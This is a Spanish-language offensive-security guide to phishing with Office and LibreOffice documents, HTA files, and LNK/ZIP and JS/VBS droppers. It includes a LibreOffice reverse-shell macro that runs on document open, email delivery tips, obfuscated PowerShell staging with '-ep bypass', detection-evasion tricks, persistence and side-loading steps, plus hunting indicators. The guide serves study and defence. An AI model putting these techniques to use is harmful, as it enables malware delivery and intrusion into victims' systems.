...
Microsoft Word realiza la validación de los datos del archivo antes de abrirlo. La validación de datos se realiza identificando la estructura de datos conforme al estándar OfficeOpenXML. Si se produce algún error durante la identificación de la estructura de datos, el archivo analizado no se abrirá.
...
Por ejemplo, un archivo RTF no admite macros por diseño, pero un archivo DOCM cuyo nombre se haya cambiado a RTF será gestionado por Microsoft Word y podrá ejecutar macros.\
...
![Documentos de Office - External Image Load: Ve a: Insert -- Quick Parts -- Field](<../../images/image (155).png>)
...
Hazlo porque **no puedes guardar macros dentro de un `.docx`** y existe un **estigma** **en torno a** la extensión **`.docm`** compatible con macros (por ejemplo, el icono de miniatura tiene un enorme `!` y algunas gateways web/de correo los bloquean por completo). Por lo tanto, esta **extensión `.doc` heredada es el mejor compromiso**.
...
Los documentos de LibreOffice Writer pueden incrustar macros de Basic y ejecutarlas automáticamente cuando se abre el archivo, vinculando la macro al evento **Open Document** (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> Una macro simple de reverse shell tiene el siguiente aspecto:
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
Ten en cuenta las comillas dobles (`""`) dentro de la cadena: LibreOffice Basic las usa para escapar comillas literales, por lo que los payloads que terminan en `...==""")` mantienen equilibrados tanto el comando interno como el argumento de Shell.

Consejos de entrega:

- Guarda el archivo como `.odt` y vincula la macro al evento del documento para que se ejecute inmediatamente al abrirlo.
- Al enviar el correo con `swaks`, usa `--attach @resume.odt` (el carácter `@` es obligatorio para que se envíen los bytes del archivo, no la cadena con el nombre del archivo, como adjunto). Esto es fundamental al abusar de servidores SMTP que aceptan destinatarios `RCPT TO` arbitrarios sin validación.

## Archivos HTA

Un HTA es un programa de Windows que **combina HTML y lenguajes de scripting (como VBScript y JScript)**. Genera la interfaz de usuario y se ejecuta como una aplicación con "total confianza", sin las restricciones del modelo de seguridad de un navegador.

Un HTA se ejecuta mediante **`mshta.exe`**, que normalmente se **instala** junto con **Internet Explorer**, por lo que **`mshta` depende de IE**. Por lo tanto, si se ha desinstalado, los HTA no podrán ejecutarse.
```html
<--! Basic HTA Execution -->
<html>
<head>
...
Las campañas altamente efectivas distribuyen un ZIP que contiene dos documentos señuelo legítimos (PDF/DOCX) y un .lnk malicioso. El truco consiste en que el loader de PowerShell real se almacena dentro de los raw bytes del ZIP después de un marcador único, y el .lnk lo extrae y lo ejecuta completamente en memoria.<sup>[[2]](#references)</sup>
...
2) Leer los bytes del ZIP y buscar un marcador hardcodeado (por ejemplo, xFIQCV). Todo lo que aparezca después del marcador será el payload de PowerShell incrustado.
...
Ejemplo de skeleton de PowerShell para extraer y ejecutar la etapa incrustada:
```powershell
...
Persistence utilizada en la misma cadena
- COM TypeLib hijacking del control Microsoft Web Browser, de modo que IE/Explorer o cualquier aplicación que lo integre vuelva a lanzar el payload automáticamente.<sup>[[2]](#references)[[4]](#references)</sup> Consulta los detalles y los comandos listos para usar aquí:
...
## Staging que prioriza el señuelo LNK → Persistence mediante tarea programada → side-loading de CPL de confianza
...
2. PowerShell fragmenta tokens evidentes (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`), por lo que las detecciones simples que buscan `iwr`, `gci`, `ren`, `cpi` o `schtasks` no detectan el comando.
...
5. La Persistence se establece mediante una **tarea programada basada en minutos** que inicia un binario host de confianza desde una ruta en la que el usuario puede escribir.

Indicadores mínimos para el hunting de este patrón:
```powershell
...
```
Un diseño de staging útil que se debe reconocer es:
...
En el caso práctico de Rapid7, la tarea programada ejecutaba repetidamente **`Fondue.exe`** desde `C:\Users\Public\`. Como **`APPWIZ.cpl`** estaba ubicado junto a él y exportaba **`RunFODW`**, el binario de Microsoft de confianza cargaba mediante side-loading el CPL del atacante en lugar de la copia legítima del sistema.
...
- Lo ejecuta indirectamente pasando el puntero al shellcode como callback para **`EnumUILanguagesW`**
...
El payload descifrado en esta campaña era shellcode de **Donut**, que después mapeaba el PE final completamente en memoria y parcheaba **AMSI/WLDP/ETW** en el proceso actual antes de ceder la ejecución. Para obtener notas más detalladas sobre side-loading y el postprocesamiento residente en memoria, consulta:
...
- Descargas de corta duración en **`C:\Users\Public\`**, seguidas de renombrados inmediatos desde extensiones sin sentido.
...
Las cadenas de carga recientes entregan un JavaScript/VBS ofuscado que decodifica y ejecuta un PowerShell stager en Base64. Ese stager descarga una imagen (a menudo GIF) que contiene una DLL .NET codificada en Base64 y oculta como texto plano entre marcadores únicos de inicio/fin. El script busca estos delimitadores (ejemplos observados en la realidad: «<<sudo_png>> … <<sudo_odt>>>»), extrae el texto intermedio, lo decodifica de Base64 a bytes, carga el assembly en memoria e invoca un método de entrada conocido con la URL de C2.<sup>[[5]](#references)</sup>

Flujo de trabajo
- Etapa 1: Dropper JS/VBS archivado → decodifica el Base64 incrustado → ejecuta el PowerShell stager con -nop -w hidden -ep bypass.
- Etapa 2: PowerShell stager → descarga la imagen, extrae el Base64 delimitado por marcadores, carga la DLL .NET en memoria y llama a su método (por ejemplo, VAI), pasándole la URL de C2 y las opciones.
- Etapa 3: El loader recupera el payload final y normalmente lo inyecta mediante process hollowing en un binario de confianza (habitualmente MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Consulta más información sobre process hollowing y la ejecución proxy mediante utilidades de confianza aquí:
...
## JS/VBS droppers → staging de PowerShell mediante Base64

Una etapa inicial recurrente es un `.js` o `.vbs` pequeño y fuertemente ofuscado, distribuido dentro de un archivo comprimido. Su único propósito es decodificar un string Base64 incrustado y lanzar PowerShell con `-nop -w hidden -ep bypass` para iniciar la siguiente etapa mediante HTTPS.<sup>[[5]](#references)</sup>
...
- Adjuntos JS/VBS comprimidos que generan `powershell.exe` con `-enc`/`FromBase64String` en la línea de comandos.
...
- [2] [Investigación de Check Point – Campaña ZipLine: un sofisticado ataque de phishing dirigido a empresas estadounidenses](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
